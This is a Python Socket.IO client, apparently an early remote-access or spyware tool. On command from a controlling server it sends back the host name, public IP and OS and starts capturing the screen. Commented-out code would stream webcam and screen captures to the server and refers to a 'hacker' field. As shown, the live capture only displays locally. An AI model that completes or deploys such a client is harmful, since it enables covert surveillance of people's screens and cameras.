from copyreg import pickle
import socketio
from requests import get
import socket
import platform
import pyautogui
import numpy as np
import struct
import cv2
import pickle
from time import sleep

sio = socketio.Client()

isRemotting = False

@sio.event
def connect():
  print("I'm connected!")

@sio.on('info')
def myInfo():
  ip = get("https://api.ipify.org").text

  sio.emit('my info', {
    'name': socket.gethostname(),
    'ip': ip,
    'os': "mac" if platform.system() == "Darwin" else platform.system()
  })

@sio.on('stop remote')
def remoteStop():
  global isRemotting
  isRemotting = False

@sio.on('remote start')
def remoteStart():
  sleep(1)
  global isRemotting
  isRemotting = True

  while True:
    # ret, frame = cam.read()
    frame = pyautogui.screenshot()
    frame = np.array(frame)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    cv2.imshow('result', frame)
    if cv2.waitKey(1) == 27:
      break

  cv2.destroyAllWindows()
  # s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  # s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1000000)
  # server_ip = "localhost"
  # server_port = 8001

  # cam = cv2.VideoCapture(0)

  # while True:
  #   ret,photo = cam.read()
  #   cv2.imshow('streaming',photo)
  #   ret,buffer = cv2.imencode(".jpg",photo,[int(cv2.IMWRITE_JPEG_QUALITY),30])
  #   x_as_bytes = pickle.dumps(buffer)
  #   s.sendto((x_as_bytes),(server_ip,server_port))
  #   if cv2.waitKey(10)==13:
  #     break
  # while isRemotting:
  #   screen = pyautogui.screenshot()
  #   src = np.array(screen)

  #   sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})

if __name__ == '__main__':
  sio.connect('http://localhost:8000')